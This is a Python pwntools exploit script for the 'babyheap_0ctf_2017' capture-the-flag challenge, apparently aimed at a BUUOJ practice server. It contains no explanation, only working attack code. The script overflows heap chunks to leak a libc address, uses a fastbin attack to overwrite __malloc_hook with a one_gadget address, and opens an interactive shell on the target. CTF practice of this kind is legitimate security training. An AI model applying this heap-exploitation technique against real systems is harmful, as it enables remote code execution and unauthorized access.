from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
#io = process('./babyheap_0ctf_2017')
io = remote("node3.buuoj.cn", 28982)
libc = ELF("libc-x64-2.23.so")
def allocate(size):
	io.recvuntil("Command: ")
	io.sendline("1")#allocate
	io.recvuntil("Size: ")
	io.sendline(str(size))

def fill(index,content):
	io.recvuntil('Command: ')
	io.sendline('2')
	io.recvuntil('Index: ')
	io.sendline(str(index))
	io.recvuntil('Size: ')
	io.sendline(str(len(content)))
	io.recvuntil('Content: ')
	io.send(content)


def free(index):
	io.recvuntil("Command: ")
	io.sendline("3")#free
	io.recvuntil("Index: ")
	io.sendline(str(index))

def dump(index):
	io.recvuntil("Command: ")
	io.sendline("4")
	io.recvuntil("Index: ")
	io.sendline(str(index))

allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x80)
free(1)
free(2)

payload = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
payload += p8(0x80)

fill(0,payload)
payload = p64(0) * 3
payload += p64(0x21)
fill(3,payload)
allocate(0x10)
allocate(0x10)

payload = p64(0) * 3
payload += p64(0x91)

fill(3,payload)
allocate(0x80)
free(4)

dump(2)
io.recvuntil("Content: \n")

libc_base = u64(io.recv(8)) - 0x3c4b78
malloc_hook = libc_base + libc.symbols['__malloc_hook']

allocate(0x60)
free(4)
payload = p64(malloc_hook - 35)
fill(2, payload)
 
allocate(0x60)
allocate(0x60)
 
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4526a)
fill(6, payload)
 
allocate(50)
io.interactive()